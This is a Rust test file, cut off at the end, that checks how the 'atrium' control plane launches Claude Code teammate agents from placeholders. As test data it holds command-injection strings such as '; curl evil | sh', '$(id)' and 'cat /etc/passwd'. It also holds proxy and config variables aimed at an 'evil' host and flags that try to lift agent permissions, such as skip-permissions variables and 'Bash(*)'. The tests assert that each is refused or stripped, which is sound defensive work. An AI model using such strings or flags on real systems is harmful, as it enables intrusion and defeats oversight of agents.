//! Claude Code 2.1.325's teammate launch through the control plane: the
//! placeholder (`spawn` with `hold`) and the teammate that takes it over
//! (`respawn` with `teammate`), against real panes.
//!
//! The lead here is recorded as started with a stand-in `claude` (a script
//! that writes the environment it was started with beside itself and
//! exits), so a teammate launch runs that and never a real Claude Code. The
//! session's trust is `Off`, as in every test of this crate.

use super::super::panes::{is_claude_pane, pane_by_agent_mut};
use super::operator_tests::{err, ok, op, operators, s, Fx, BRIDGE};
use super::*;
use atrium::ctl::TrustMode;
use json::Value;
use std::path::{Path, PathBuf};

/// A scratch directory holding the stand-in `claude`.
struct Standin {
    dir: PathBuf,
    claude: String,
}

impl Standin {
    fn new(tag: &str) -> Standin {
        let dir =
            std::env::temp_dir().join(format!("atrium-teammate-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        #[cfg(windows)]
        let claude = {
            let file = dir.join("claude.cmd");
            // Written whole, then moved into place: a reader never sees half.
            std::fs::write(
                &file,
                "@set>\"%~dp0env.tmp\"\r\n@move /y \"%~dp0env.tmp\" \"%~dp0env.txt\">nul\r\n@exit /b 0\r\n",
            )
            .unwrap();
            file
        };
        #[cfg(unix)]
        let claude = {
            use std::os::unix::fs::PermissionsExt;
            let file = dir.join("claude");
            std::fs::write(
                &file,
                "#!/bin/sh\nd=$(dirname \"$0\")\nenv > \"$d/env.tmp\"\nmv \"$d/env.tmp\" \"$d/env.txt\"\nexit 0\n",
            )
            .unwrap();
            std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o755)).unwrap();
            file
        };
        Standin {
            claude: claude.to_string_lossy().into_owned(),
            dir,
        }
    }

    /// The environment the stand-in was last started with.
    fn env_seen(&self) -> String {
        let file = self.dir.join("env.txt");
        let by = std::time::Instant::now() + std::time::Duration::from_secs(20);
        loop {
            // Bytes, not text: a console writes it in its own code page.
            match std::fs::read(&file).map(|b| String::from_utf8_lossy(&b).into_owned()) {
                Ok(text) if text.contains("CLAUDECODE") => return text,
                _ if std::time::Instant::now() >= by => {
                    panic!("the stand-in claude never wrote {}", file.display())
                }
                _ => std::thread::sleep(std::time::Duration::from_millis(50)),
            }
        }
    }
}

impl Drop for Standin {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// A claude lead: an agent's pane recorded as started with the stand-in.
fn lead(fx: &mut Fx, standin: &Standin, role: &str, parent: Option<AgentId>) -> (AgentId, String) {
    let out = fx.agent_pane(role, parent);
    pane_by_agent_mut(&mut fx.windows, out.0).unwrap().argv = vec![standin.claude.clone()];
    out
}

fn as_pane(token: &str, body: &str) -> String {
    format!(r#"{{"token":"{token}",{body}}}"#)
}

fn jstr(v: &str) -> String {
    Value::String(v.to_string()).to_string()
}

const HOLD: &str = r#""cmd":"spawn","hold":true,"window":false,"focus":false"#;

/// A placeholder for the pane holding `token`; its id.
fn hold(fx: &mut Fx, token: &str) -> AgentId {
    let v = fx.apply(&operators(&[]), &as_pane(token, HOLD));
    assert!(ok(&v), "{v}");
    AgentId(v.get("pane").and_then(Value::as_i64).expect("a pane id") as usize)
}

fn respawn_body(target: &str, line: &str) -> String {
    format!(
        r#""cmd":"respawn","target":{},"teammate":{}"#,
        jstr(target),
        jstr(line)
    )
}

fn respawn(fx: &mut Fx, token: &str, target: AgentId, line: &str) -> Value {
    fx.apply(
        &operators(&[]),
        &as_pane(token, &respawn_body(&target.to_string(), line)),
    )
}

/// Claude Code 2.1.325's quoting function.
fn q(word: &str) -> String {
    let bare = |c: char| {
        c.is_ascii_alphanumeric()
            || matches!(c, '_' | '.' | '/' | ':' | '=' | '@' | '+' | ',' | '-')
    };
    if word.is_empty() {
        "''".to_string()
    } else if word.chars().all(bare) {
        word.to_string()
    } else {
        format!("'{}'", word.replace('\'', "'\"'\"'"))
    }
}

/// The project directory: where the tests run, which is atrium's own.
fn project() -> String {
    std::env::current_dir()
        .unwrap()
        .to_string_lossy()
        .into_owned()
}

const KEY: &str = "1763200000000.MCowBQYDK2VwAyEAq3x1Zb0m2m1Yw6i8cQ9fYt5n0u7JH2k4L-_dV3sT1aE";

/// A 2.1.325 teammate command for `name`, as the fixtures spell it: in
/// `cwd`, with a path to a claude that is **not** the lead's, forwarded
/// variables a pane must not be able to set, and `rest` after the identity.
fn line_in(cwd: &str, name: &str, rest: &str) -> String {
    format!(
        "cd {} && env CLAUDECODE=1 CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1 CLAUDE_CODE_TASK_LIST_ID=demo CLAUDE_CONFIG_DIR=/evil-from-the-string HTTPS_PROXY=http://evil-from-the-string:1 ANTHROPIC_PROFILE='' CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS=1 {} --agent-id {name}@demo --agent-name {name} --team-name demo --agent-color blue --parent-session-id 0b9f6c1e-2a67-4c58-9d0e-6f4f8a1d2c33 --lead-verify-key {KEY}{rest}",
        q(cwd),
        q("/somewhere/else/bin/claude"),
    )
}

fn line(name: &str, rest: &str) -> String {
    line_in(&project(), name, rest)
}

fn hold_command() -> Vec<String> {
    vec![
        std::env::current_exe()
            .unwrap()
            .to_string_lossy()
            .into_owned(),
        atrium::tmux_shim::HOLD_FLAG.to_string(),
    ]
}

fn pane(fx: &Fx, id: AgentId) -> &Pane {
    pane_by_agent(&fx.windows, id).expect("the pane is live")
}

// ---- the placeholder ---------------------------------------------------------

#[test]
fn a_placeholder_is_atriums_own_waiting_program_beside_its_lead() {
    let standin = Standin::new("hold");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let v = fx.apply(&operators(&[]), &as_pane(&token, HOLD));
    assert!(ok(&v), "{v}");
    assert!(v.get("role").is_none_or(|r| *r == Value::Null), "{v}");
    let id = AgentId(v.get("pane").and_then(Value::as_i64).unwrap() as usize);
    assert_eq!(s(&fx.last(), "detail"), "hold beside=- size=-");
    // Beside the lead, in the lead's window, as its child.
    assert_eq!(fx.windows.len(), 1, "no new window");
    assert_eq!(fx.windows[0].panes.len(), 2);
    let p = pane(&fx, id);
    assert!(p.placeholder);
    assert_eq!(p.parent, Some(lead_id));
    assert_eq!(p.depth, 1);
    assert_eq!(p.role, None);
    // atrium's own executable and the one flag: nothing of the request's.
    assert_eq!(p.argv, hold_command());
    assert_eq!(p.title, atrium::tmux_shim::HOLD_TITLE);
    // No credential, no agent treatment.
    assert_eq!(p.token, None, "a placeholder holds no token");
    assert_eq!(p.identity, None);
    assert_eq!(p.session_id, None);
    assert_eq!(p.mode, TrustMode::Off);
    assert!(!p.can_spawn);
    assert!(!is_agent_pane(p) && !is_claude_pane(p));
    // It counts in the tree the shim lists, under its lead.
    let v = fx.apply(&operators(&[]), r#"{"cmd":"list"}"#);
    let tree = v.get("tree").and_then(Value::as_array).unwrap();
    let node = tree
        .iter()
        .find(|n| n.get("id").and_then(Value::as_i64) == Some(id.0 as i64))
        .expect("the placeholder is listed");
    assert_eq!(
        node.get("parent").and_then(Value::as_i64),
        Some(lead_id.0 as i64)
    );
    // The split's anchor and share are taken as for an agent split.
    let body = format!(r#"{HOLD},"beside":{},"size":"70%""#, id.0);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(ok(&v), "{v}");
    assert_eq!(
        s(&fx.last(), "detail"),
        format!("hold beside={} size=70%", id.0)
    );
    assert_eq!(fx.windows[0].panes.len(), 3);
}

#[test]
fn only_a_claude_agents_pane_gets_a_placeholder() {
    let standin = Standin::new("who");
    let mut fx = Fx::new();
    let (lead_id, lead_token) = lead(&mut fx, &standin, "lead", None);
    let (_, shell_token) = fx.pane("sh", Some(lead_id));
    let (codex, codex_token) = fx.agent_pane("codex", Some(lead_id));
    pane_by_agent_mut(&mut fx.windows, codex).unwrap().argv = vec!["codex".to_string()];
    let before: usize = fx.windows.iter().map(|w| w.panes.len()).sum();
    // A shell, another agent CLI, an operator, nobody.
    for token in [&shell_token, &codex_token] {
        let v = fx.apply(&operators(&[]), &as_pane(token, HOLD));
        assert_eq!(err(&v), super::super::spawn::HOLD_NEEDS_CLAUDE, "{v}");
    }
    let v = fx.apply(&operators(&["spawn"]), &op(BRIDGE, HOLD));
    assert!(!ok(&v), "an operator gets no placeholder: {v}");
    let v = fx.apply(&operators(&[]), &format!("{{{HOLD}}}"));
    assert!(err(&v).contains("unauthenticated"), "{v}");
    // A lead that may not create teammates, and the depth cap.
    pane_by_agent_mut(&mut fx.windows, lead_id)
        .unwrap()
        .can_spawn = false;
    let v = fx.apply(&operators(&[]), &as_pane(&lead_token, HOLD));
    assert!(err(&v).contains("not permitted to create teammates"), "{v}");
    pane_by_agent_mut(&mut fx.windows, lead_id)
        .unwrap()
        .can_spawn = true;
    fx.max_depth = 0;
    let v = fx.apply(&operators(&[]), &as_pane(&lead_token, HOLD));
    assert!(err(&v).contains("exceeds --max-depth 0"), "{v}");
    fx.max_depth = atrium::ctl::DEFAULT_MAX_DEPTH;
    let after: usize = fx.windows.iter().map(|w| w.panes.len()).sum();
    assert_eq!(before, after, "no refusal left a pane behind");
    // The placeholder word itself is still no command a pane may spawn.
    for argv in [
        r#"["cat"]"#,
        r#"["cat","/etc/passwd"]"#,
        r#"["atrium","--tmux-hold"]"#,
    ] {
        let body = format!(r#""cmd":"spawn","window":false,"argv":{argv}"#);
        let v = fx.apply(&operators(&[]), &as_pane(&lead_token, &body));
        assert!(
            err(&v).contains("not on the agent allowlist"),
            "{argv}: {v}"
        );
    }
    // And a hold request cannot carry one.
    let body = format!(r#"{HOLD},"argv":["cat"]"#);
    let v = fx.apply(&operators(&[]), &as_pane(&lead_token, &body));
    assert!(err(&v).contains("a hold spawn is a placeholder"), "{v}");
    let after: usize = fx.windows.iter().map(|w| w.panes.len()).sum();
    assert_eq!(before, after);
}

#[test]
fn a_placeholder_takes_no_text_is_not_respawned_and_is_killed_by_its_lead() {
    let standin = Standin::new("kill");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let (_, other_token) = lead(&mut fx, &standin, "other", Some(lead_id));
    let id = hold(&mut fx, &token);
    // Text is typed into an agent's pane only; a placeholder is nobody's.
    let body = format!(r#""cmd":"send","target":"{id}","text":"hello""#);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(err(&v).contains("is not an agent's pane"), "{v}");
    assert_eq!(fx.queued_for(id), 0);
    // A plain respawn would replay atrium's own program with a token.
    let body = format!(r#""cmd":"respawn","target":"{id}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(err(&v).contains("is a teammate placeholder"), "{v}");
    let v = fx.apply(&operators(&["respawn"]), &op(BRIDGE, &body));
    assert!(!ok(&v), "{v}");
    assert!(pane(&fx, id).placeholder && pane(&fx, id).token.is_none());
    assert_eq!(pane(&fx, id).argv, hold_command());
    // Outside its subtree nobody kills it; its lead does.
    let body = format!(r#""cmd":"kill","target":"{id}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&other_token, &body));
    assert!(err(&v).contains("outside your subtree"), "{v}");
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(ok(&v), "{v}");
    assert!(pane(&fx, id).exited);
    // Killed, it is no longer a place to start a teammate.
    let v = respawn(&mut fx, &token, id, &line("researcher", ""));
    assert!(
        err(&v).contains("is not a placeholder this pane made"),
        "{v}"
    );
}

// ---- the teammate ------------------------------------------------------------

#[test]
fn respawn_pane_turns_the_leads_own_placeholder_into_the_teammate_once() {
    let standin = Standin::new("once");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let slot_in_tree = pane(&fx, id).id;
    let text = line(
        "researcher",
        " --permission-mode acceptEdits --settings /evil/settings.json --plugin-dir /evil/plugin --model claude-opus-4-5",
    );
    let v = respawn(&mut fx, &token, id, &text);
    assert!(ok(&v), "{v}");
    // The same pane id: Claude Code goes on calling it `%N`.
    assert_eq!(v.get("pane").and_then(Value::as_i64), Some(id.0 as i64));
    assert_eq!(s(&v, "role"), "researcher");
    let note = s(&v, "note");
    // Of the four assignments atrium did not apply, the ones that would
    // have changed the teammate's environment are named; no value is.
    assert!(note.contains("from the lead were not passed on"), "{note}");
    assert!(
        note.contains("CLAUDE_CONFIG_DIR") && note.contains("HTTPS_PROXY"),
        "{note}"
    );
    assert!(!note.contains("evil"), "{note}");
    assert!(
        note.contains("not passed on: --settings, --plugin-dir"),
        "{note}"
    );
    assert!(
        note.contains("asked for accept; held to its lead pane's default"),
        "{note}"
    );
    assert_eq!(
        fx.windows[0].panes.len(),
        2,
        "the pane was replaced, not added"
    );
    let p = pane(&fx, id);
    assert!(!p.placeholder);
    assert_eq!(p.agent_id, id);
    assert_eq!(p.id, slot_in_tree, "it keeps its place in the layout");
    assert_eq!(p.parent, Some(lead_id));
    assert_eq!(p.depth, 1);
    assert_eq!(p.role.as_deref(), Some("researcher"));
    assert!(is_agent_pane(p) && is_claude_pane(p));
    assert_eq!(p.title, "claude");
    assert!(p.token.is_some(), "a teammate is a pane with a token");
    assert!(
        p.session_id.is_some(),
        "atrium binds it like any claude pane"
    );
    assert!(!p.exited);
    // The program is the lead's own; the flags are the table's.
    assert_eq!(
        p.argv,
        [
            standin.claude.as_str(),
            "--agent-id",
            "researcher@demo",
            "--agent-name",
            "researcher",
            "--team-name",
            "demo",
            "--agent-color",
            "blue",
            "--parent-session-id",
            "0b9f6c1e-2a67-4c58-9d0e-6f4f8a1d2c33",
            "--lead-verify-key",
            KEY,
            "--model",
            "claude-opus-4-5",
        ]
    );
    // The session's trust is `Off`: no request can come out above it.
    assert_eq!(p.mode, TrustMode::Off);
    // The process got the three variables and none of the string's others.
    let env = standin.env_seen();
    assert!(env.contains("CLAUDECODE=1"), "{env}");
    assert!(
        env.contains("CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1"),
        "{env}"
    );
    assert!(env.contains("CLAUDE_CODE_TASK_LIST_ID=demo"), "{env}");
    assert!(!env.contains("evil-from-the-string"), "{env}");
    assert!(
        !env.contains("CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS=1"),
        "{env}"
    );
    // The audit: what atrium decided, then the request with its flag names,
    // both under the lead; the key's value and the string's paths in neither.
    let log = fx.log();
    let [.., decided, request] = log.as_slice() else {
        panic!("two rows");
    };
    assert_eq!(s(request, "action"), "respawn");
    assert_eq!(
        s(request, "detail"),
        format!(
            "target={id} teammate flags=--agent-id,--agent-name,--team-name,--agent-color,\
             --parent-session-id,--lead-verify-key,--permission-mode,--settings,--plugin-dir,\
             --model unknown=0 env=7"
        )
    );
    assert_eq!(s(decided, "action"), "teammate");
    assert_eq!(
        s(decided, "detail"),
        format!(
            "pane={id} role=researcher mode=default env_dropped=4 \
             flags_dropped=--settings,--plugin-dir"
        )
    );
    for row in [request, decided] {
        assert_eq!(
            row.get("caller").and_then(Value::as_i64),
            Some(lead_id.0 as i64),
            "{row}"
        );
        let row = row.to_string();
        for secret in [KEY, "MCowBQYDK2VwAyEA", "evil", "/somewhere/else"] {
            assert!(!row.contains(secret), "{secret} is in {row}");
        }
    }
    // Once. The pane now runs a command, and nothing re-points it.
    let argv = p.argv.clone();
    let token_then = p.token.clone();
    let v = respawn(&mut fx, &token, id, &line("second", ""));
    assert!(
        err(&v).contains("is not a placeholder this pane made"),
        "{v}"
    );
    let p = pane(&fx, id);
    assert_eq!(p.argv, argv);
    assert_eq!(p.token, token_then);
    assert_eq!(p.role.as_deref(), Some("researcher"));
    // The lead still kills its teammate by the id it was given.
    let body = format!(r#""cmd":"kill","target":"{id}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(ok(&v), "{v}");
    assert!(pane(&fx, id).exited);
}

#[test]
fn respawn_pane_never_re_points_a_pane_that_is_not_the_callers_placeholder() {
    let standin = Standin::new("repoint");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let (dev, dev_token) = lead(&mut fx, &standin, "dev", Some(lead_id));
    let (sh, _) = fx.pane("sh", Some(lead_id));
    let (rival, rival_token) = lead(&mut fx, &standin, "rival", None);
    let rivals = hold(&mut fx, &rival_token);
    let devs = hold(&mut fx, &dev_token);
    let text = line("mole", "");
    // An agent's pane, a shell, the caller itself, another lead's
    // placeholder, a child's own placeholder, a role, an id nobody has.
    let before: Vec<(AgentId, Vec<String>, Option<String>, bool)> = fx
        .windows
        .iter()
        .flat_map(|w| &w.panes)
        .map(|p| (p.agent_id, p.argv.clone(), p.token.clone(), p.placeholder))
        .collect();
    for target in [
        dev.to_string(),
        sh.to_string(),
        lead_id.to_string(),
        rival.to_string(),
        rivals.to_string(),
        devs.to_string(),
        "dev".to_string(),
        "9999".to_string(),
        "-1".to_string(),
        "".to_string(),
    ] {
        let v = fx.apply(
            &operators(&[]),
            &as_pane(&token, &respawn_body(&target, &text)),
        );
        assert!(
            err(&v).contains("is not a placeholder this pane made"),
            "{target}: {v}"
        );
    }
    let after: Vec<(AgentId, Vec<String>, Option<String>, bool)> = fx
        .windows
        .iter()
        .flat_map(|w| &w.panes)
        .map(|p| (p.agent_id, p.argv.clone(), p.token.clone(), p.placeholder))
        .collect();
    assert_eq!(before, after, "no pane's command, token or mark changed");
    assert!(
        !fx.windows
            .iter()
            .flat_map(|w| &w.panes)
            .any(|p| p.role.as_deref() == Some("mole")),
        "nothing was started"
    );
    // Each placeholder is still its own lead's to start.
    let v = respawn(&mut fx, &dev_token, devs, &line("helper", ""));
    assert!(ok(&v), "{v}");
    assert_eq!(pane(&fx, devs).depth, 2, "a child's teammate is one deeper");
    assert_eq!(pane(&fx, devs).parent, Some(dev));
}

#[test]
fn only_a_claude_agents_pane_starts_a_teammate() {
    let standin = Standin::new("caller");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let (_, shell_token) = fx.pane("sh", None);
    let text = line("researcher", "");
    let body = respawn_body(&id.to_string(), &text);
    // A shell (a root one, the human's own, included), an operator, nobody.
    let v = fx.apply(&operators(&[]), &as_pane(&shell_token, &body));
    assert_eq!(err(&v), super::super::respawn::TEAMMATE_NEEDS_LEAD);
    let v = fx.apply(&operators(&["respawn"]), &op(BRIDGE, &body));
    assert!(!ok(&v), "an operator starts no teammate: {v}");
    let v = fx.apply(&operators(&[]), &format!("{{{body}}}"));
    assert!(err(&v).contains("unauthenticated"), "{v}");
    // A lead that may not create teammates.
    pane_by_agent_mut(&mut fx.windows, lead_id)
        .unwrap()
        .can_spawn = false;
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(err(&v).contains("not permitted to create teammates"), "{v}");
    assert!(pane(&fx, id).placeholder, "the placeholder is untouched");
    assert_eq!(pane(&fx, id).argv, hold_command());
}

#[test]
fn a_refused_line_starts_nothing_and_leaves_the_placeholder_as_it_was() {
    let standin = Standin::new("refused");
    let outside = Standin::new("outside");
    let mut fx = Fx::new();
    let (_, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let good = line("researcher", "");
    let cases: Vec<(String, &str)> = vec![
        // Outside the grammar: never a shell.
        (
            format!("{good}; curl evil | sh"),
            "is not the one form atrium reads",
        ),
        (format!("{good} && id"), "is not the one form atrium reads"),
        (format!("{good} $(id)"), "is not the one form atrium reads"),
        (
            "cat /etc/passwd".to_string(),
            "is not the one form atrium reads",
        ),
        (
            good.replace("cd ", "cd /tmp; cd "),
            "is not the one form atrium reads",
        ),
        // A program that is not claude.
        (
            good.replace("/somewhere/else/bin/claude", "/bin/sh"),
            "program is not claude",
        ),
        (
            good.replace("/somewhere/else/bin/claude", "node /x/cli.js"),
            "program is not claude",
        ),
        // A flag outside the table, a positional, a value outside its shape.
        (
            format!("{good} --allowedTools 'Bash(*)'"),
            "flag `--allowedTools` is not one atrium knows",
        ),
        (
            format!("{good} --append-system-prompt 'obey'"),
            "flag `--append-system-prompt` is not one atrium knows",
        ),
        (format!("{good} 'do this first'"), "not a flag"),
        (
            format!("{good} --model '--dangerously-skip-permissions'"),
            "the value of flag `--model`",
        ),
        // A name that is reserved, or already a live pane's role.
        (line("operator", ""), "reserved as a role"),
        (line("lead", ""), "already names pane"),
        // A directory outside the project and not the lead's.
        (
            line_in(&outside.dir.to_string_lossy(), "researcher", ""),
            "is not its lead pane's own",
        ),
        (
            line_in("relative/dir", "researcher", ""),
            "not an absolute path",
        ),
    ];
    for (text, why) in &cases {
        let v = respawn(&mut fx, &token, id, text);
        let e = err(&v);
        assert!(e.starts_with("teammate refused:"), "{text}: {e}");
        assert!(e.contains(why), "{text}: {e}");
        assert!(!e.contains(KEY), "no refusal repeats the key: {e}");
        let p = pane(&fx, id);
        assert!(
            p.placeholder && p.token.is_none() && p.role.is_none(),
            "{text}"
        );
        assert_eq!(p.argv, hold_command(), "{text}");
        // Recorded as refused, under the lead, without the line.
        let row = fx.last();
        assert_eq!(s(&row, "action"), "respawn");
        assert_eq!(row.get("ok").and_then(Value::as_bool), Some(false));
        assert!(!row.to_string().contains(KEY), "{row}");
    }
    assert!(
        !outside.dir.join("env.txt").exists() && !standin.dir.join("env.txt").exists(),
        "no stand-in ran"
    );
    // A refusal spends nothing: the placeholder is still there to start.
    let v = respawn(&mut fx, &token, id, &good);
    assert!(ok(&v), "{v}");
    assert_eq!(pane(&fx, id).role.as_deref(), Some("researcher"));
}

#[test]
fn a_teammate_inherits_its_leads_deny_rules_and_adds_the_lines_own() {
    let standin = Standin::new("deny");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    pane_by_agent_mut(&mut fx.windows, lead_id).unwrap().deny =
        vec!["Bash(git push:*)".to_string()];
    let id = hold(&mut fx, &token);
    let v = respawn(
        &mut fx,
        &token,
        id,
        &line(
            "researcher",
            " --disallowed-tools 'Bash(git push:*)' --disallowed-tools 'Read(./.env)' --plan-mode-required --permission-mode plan",
        ),
    );
    assert!(ok(&v), "{v}");
    let p = pane(&fx, id);
    assert_eq!(p.deny, ["Bash(git push:*)", "Read(./.env)"]);
    // The switch is passed on. The session has no `--trust`, so atrium
    // governs nothing here, and the teammate asked for plan is plan all the
    // same: the one permission flag in its command is atrium's own.
    assert!(p.argv.iter().any(|a| a == "--plan-mode-required"));
    assert!(!p.argv.iter().any(|a| a.contains("disallowed")));
    assert_eq!(p.mode, TrustMode::Off);
    let n = p.argv.len();
    assert_eq!(
        p.argv[n - 2..],
        ["--permission-mode", "plan"],
        "{:?}",
        p.argv
    );
    assert_eq!(
        p.argv.iter().filter(|a| a.contains("permission")).count(),
        1,
        "{:?}",
        p.argv
    );
    let decided = fx
        .log()
        .into_iter()
        .rev()
        .find(|r| s(r, "action") == "teammate")
        .expect("the teammate row");
    assert!(s(&decided, "detail").contains("mode=plan"), "{decided}");
}

/// A teammate starts where its lead is. A lead atrium started in a directory
/// of its own has its teammate there, from atrium's record; a line that
/// names any other directory, a subdirectory of the project included, is
/// refused.
#[test]
fn a_teammate_starts_in_its_leads_own_directory_and_nowhere_else() {
    let standin = Standin::new("cwd");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let own = standin.dir.to_string_lossy().into_owned();
    pane_by_agent_mut(&mut fx.windows, lead_id).unwrap().cwd = Some(own.clone());
    let id = hold(&mut fx, &token);
    // The project (atrium's own directory) is not this lead's directory, and
    // neither is a directory inside it, nor one inside the lead's.
    let inside_lead = standin.dir.join("sub");
    std::fs::create_dir_all(&inside_lead).unwrap();
    for elsewhere in [
        project(),
        Path::new(&project())
            .join("src")
            .to_string_lossy()
            .into_owned(),
        inside_lead.to_string_lossy().into_owned(),
    ] {
        let v = respawn(&mut fx, &token, id, &line_in(&elsewhere, "researcher", ""));
        let e = err(&v);
        assert!(e.contains("is not its lead pane's own"), "{elsewhere}: {e}");
        assert!(e.contains("starts where its lead is"), "{e}");
        assert!(pane(&fx, id).placeholder, "{elsewhere}");
    }
    assert!(!standin.dir.join("env.txt").exists(), "nothing ran");
    let v = respawn(&mut fx, &token, id, &line_in(&own, "researcher", ""));
    assert!(ok(&v), "{v}");
    // Started from atrium's record of the lead, as the lead has it.
    assert_eq!(pane(&fx, id).cwd.as_deref(), Some(own.as_str()));
    assert_eq!(pane(&fx, id).worktree, None);
    // A lead with no directory of its own is where atrium is.
    let (_, plain_token) = lead(&mut fx, &standin, "plain", None);
    let id = hold(&mut fx, &plain_token);
    let v = respawn(&mut fx, &plain_token, id, &line_in(&own, "helper", ""));
    assert!(err(&v).contains("is not its lead pane's own"), "{v}");
    let v = respawn(&mut fx, &plain_token, id, &line("helper", ""));
    assert!(ok(&v), "{v}");
    assert_eq!(
        pane(&fx, id).cwd,
        None,
        "it inherits atrium's, as its lead does"
    );
}

// ---- the teammate's environment ---------------------------------------------

/// `teammate`, called as the dispatcher calls it, in a session whose
/// `teams_env` is `list`.
fn respawn_listed(fx: &mut Fx, lead: AgentId, target: AgentId, text: &str, list: &[&str]) -> Value {
    respawn_in(fx, lead, target, text, true, list, TrustMode::Off)
}

/// [`respawn_listed`] with teams on or off, at a given launch trust.
fn respawn_in(
    fx: &mut Fx,
    lead: AgentId,
    target: AgentId,
    text: &str,
    teams_on: bool,
    list: &[&str],
    policy: TrustMode,
) -> Value {
    let list: Vec<String> = list.iter().map(|n| n.to_string()).collect();
    let mut hold = None;
    let reply = super::super::respawn::teammate(
        &target.to_string(),
        text,
        Some(lead),
        policy,
        super::super::respawn::Teams {
            on: teams_on,
            env: &list,
        },
        &mut CtlSession {
            windows: &mut fx.windows,
            rows: 24,
            cols: 80,
            max_depth: fx.max_depth,
            extra_allow: &fx.extra_allow,
            pending: &mut fx.pending,
            world: &fx.world,
            session_identity: None,
            audit: &mut fx.audit,
            board: &mut fx.board,
            bus: &mut fx.bus,
            mods: &mut fx.mods,
            hold: &mut hold,
            held_inboxes: 0,
            flash: &mut fx.flash,
        },
    );
    json::parse(&reply.to_json()).expect("a reply is JSON")
}

/// A variable this process surely has, with its value: what the teammate
/// inherits from atrium whether or not the lead forwards it.
fn inherited() -> (&'static str, String) {
    let name = if cfg!(windows) { "SystemRoot" } else { "HOME" };
    (name, std::env::var(name).expect("the variable is set"))
}

/// The teammate runs under what atrium gave its lead, from atrium's own
/// record of the lead pane: the identity by name, and the fleet's context
/// variables. Nothing of it is the request's to say.
#[test]
fn a_teammate_gets_the_identity_and_the_fleet_environment_atrium_gave_its_lead() {
    let standin = Standin::new("given");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let ctx = standin.dir.to_string_lossy().into_owned();
    {
        let p = pane_by_agent_mut(&mut fx.windows, lead_id).unwrap();
        // A name no vault holds: the pane is tagged with it and the spawn
        // says it did not resolve, which is all a test can show of it.
        p.identity = Some("atrium-test-no-such-identity".to_string());
        p.context_env = vec![(atrium::context::ENV_DIR.to_string(), ctx.clone())];
    }
    let id = hold(&mut fx, &token);
    // A request that names an identity (or anything else that is atrium's
    // to decide) is not this verb.
    for extra in [
        r#""identity":"prod""#,
        r#""mode":"skip""#,
        r#""role":"boss""#,
        r#""argv":["sh"]"#,
        r#""env":{"X":"1"}"#,
    ] {
        let body = format!(
            "{},{extra}",
            respawn_body(&id.to_string(), &line("researcher", ""))
        );
        let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
        assert!(
            err(&v).contains("a teammate respawn takes no"),
            "{extra}: {v}"
        );
        assert!(pane(&fx, id).placeholder, "{extra}");
    }
    let v = respawn(&mut fx, &token, id, &line("researcher", ""));
    assert!(ok(&v), "{v}");
    let p = pane(&fx, id);
    assert_eq!(
        p.identity.as_deref(),
        Some("atrium-test-no-such-identity"),
        "the lead pane's own identity, by name"
    );
    assert_eq!(
        p.context_env,
        [(atrium::context::ENV_DIR.to_string(), ctx.clone())]
    );
    let env = standin.env_seen();
    assert!(
        env.contains(&format!("{}={ctx}", atrium::context::ENV_DIR)),
        "{env}"
    );
    // A lead with no identity gives none, whatever the session's is.
    let (plain_lead, plain_token) = lead(&mut fx, &standin, "plain", None);
    let id = hold(&mut fx, &plain_token);
    let v = respawn(&mut fx, &plain_token, id, &line("helper", ""));
    assert!(ok(&v), "{v}");
    assert_eq!(pane(&fx, id).identity, None);
    assert_eq!(pane(&fx, id).parent, Some(plain_lead));
}

/// With a `teams_env` list: a listed variable is set on the teammate from
/// the line; the others are dropped, and the ones that would have differed
/// are named once, on the bar, in the reply and in the audit row.
#[test]
fn a_listed_variable_reaches_the_teammate_and_the_dropped_ones_are_named() {
    let standin = Standin::new("listed");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let (same_name, same_value) = inherited();
    let text = line("researcher", "").replace(
        " CLAUDE_CONFIG_DIR=",
        &format!(
            " ANTHROPIC_BASE_URL=https://gw.example/v1 {same_name}={} ZZ_ATRIUM_TEST_UNSET='' CLAUDE_CONFIG_DIR=",
            q(&same_value)
        ),
    );
    let v = respawn_listed(&mut fx, lead_id, id, &text, &["ANTHROPIC_BASE_URL"]);
    assert!(ok(&v), "{v}");
    let env = standin.env_seen();
    assert!(
        env.contains("ANTHROPIC_BASE_URL=https://gw.example/v1"),
        "the listed variable is the line's: {env}"
    );
    assert!(!env.contains("evil-from-the-string"), "{env}");
    assert!(!env.contains("ZZ_ATRIUM_TEST_UNSET"), "{env}");
    // One line, the same in all three places.
    let flash = fx.flash.clone().expect("the bar is told").0;
    assert!(flash.starts_with("teammate researcher: "), "{flash}");
    for named in [
        "CLAUDE_CONFIG_DIR",
        "HTTPS_PROXY",
